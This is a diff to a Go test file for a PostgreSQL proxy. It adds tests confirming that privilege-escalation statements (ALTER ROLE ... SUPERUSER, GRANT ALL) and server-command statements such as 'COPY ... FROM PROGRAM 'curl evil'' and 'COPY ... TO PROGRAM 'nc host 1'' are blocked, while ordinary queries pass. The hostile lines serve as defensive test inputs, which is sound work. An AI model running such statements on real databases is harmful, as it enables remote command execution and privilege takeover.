@@ -438,10 +438,12 @@ func TestHandleQuery_BlocksPasswordChange(t *testing.T) {
 			expectErr:   ErrPasswordChangeNotAllowed,
 		},
 		{
-			name:        "write access allows ALTER USER without PASSWORD",
+			// Non-password ALTER USER is now always blocked as a role/privilege
+			// admin command (ErrAdminCommandNotAllowed), not allowed.
+			name:        "write access blocks ALTER USER without PASSWORD (admin)",
 			accessLevel: "write",
 			sql:         "ALTER USER myuser WITH LOGIN",
-			expectErr:   nil,
+			expectErr:   ErrAdminCommandNotAllowed,
 		},
 	}
 
@@ -462,6 +464,74 @@ func TestHandleQuery_BlocksPasswordChange(t *testing.T) {
 				}
 			}
 		})
+	}
+}
+
+func TestHandleQuery_BlocksAdminCommands(t *testing.T) {
+	t.Parallel()
+
+	// Role/privilege administration is always blocked, even on a full-write grant,
+	// via both the simple (handleQuery) and extended (handleParse) protocols.
+	admin := []string{
+		"ALTER ROLE app SUPERUSER",
+		"ALTER USER app CREATEROLE",
+		"CREATE ROLE r",
+		"DROP ROLE r",
+		"CREATE USER u",
+		"GRANT ALL ON t TO u",
+		"REVOKE SELECT ON t FROM u",
+		"/* c */ ALTER ROLE app SUPERUSER", // leading comment
+		"SELECT 1; GRANT ALL ON t TO u",    // trailing statement in a batch
+	}
+	for _, sql := range admin {
+		if err := newTestSession("write").handleQuery(&pgproto3.Query{String: sql}); !errors.Is(err, ErrAdminCommandNotAllowed) {
+			t.Errorf("handleQuery(%q) = %v, want ErrAdminCommandNotAllowed", sql, err)
+		}
+		if err := newTestSession("write").handleParse(&pgproto3.Parse{Query: sql}); !errors.Is(err, ErrAdminCommandNotAllowed) {
+			t.Errorf("handleParse(%q) = %v, want ErrAdminCommandNotAllowed", sql, err)
+		}
+	}
+}
+
+func TestHandleQuery_BlocksRestrictedCommands(t *testing.T) {
+	t.Parallel()
+
+	// PG-specific dangerous statements are blocked even without block_copy.
+	restricted := []string{
+		"ALTER SYSTEM SET work_mem = '1GB'",
+		"COPY t FROM PROGRAM 'curl evil'",
+		"COPY t TO PROGRAM 'nc host 1'",
+		"ALTER DEFAULT PRIVILEGES IN SCHEMA public GRANT SELECT ON TABLES TO r",
+		"CREATE SERVER s FOREIGN DATA WRAPPER postgres_fdw",
+	}
+	for _, sql := range restricted {
+		if err := newTestSession("write").handleQuery(&pgproto3.Query{String: sql}); !errors.Is(err, ErrRestrictedCommandNotAllowed) {
+			t.Errorf("handleQuery(%q) = %v, want ErrRestrictedCommandNotAllowed", sql, err)
+		}
+		if err := newTestSession("write").handleParse(&pgproto3.Parse{Query: sql}); !errors.Is(err, ErrRestrictedCommandNotAllowed) {
+			t.Errorf("handleParse(%q) = %v, want ErrRestrictedCommandNotAllowed", sql, err)
+		}
+	}
+}
+
+func TestHandleQuery_AllowsOrdinaryWorkOnFullWrite(t *testing.T) {
+	t.Parallel()
+
+	// Ordinary DML, reads, DDL, plain COPY, and SET ROLE remain allowed on a
+	// full-write grant (SET ROLE is intentionally not always-blocked).
+	allowed := []string{
+		"INSERT INTO t VALUES (1)",
+		"UPDATE t SET x = 1",
+		"SELECT * FROM t",
+		"CREATE TABLE t (id INT)",
+		"COPY t TO STDOUT",
+		"COPY t (a, b) FROM STDIN",
+		"SET ROLE admin",
+	}
+	for _, sql := range allowed {
+		if err := newTestSession("write").handleQuery(&pgproto3.Query{String: sql}); err != nil {
+			t.Errorf("handleQuery(%q) unexpected error: %v", sql, err)
+		}
 	}
 }
 
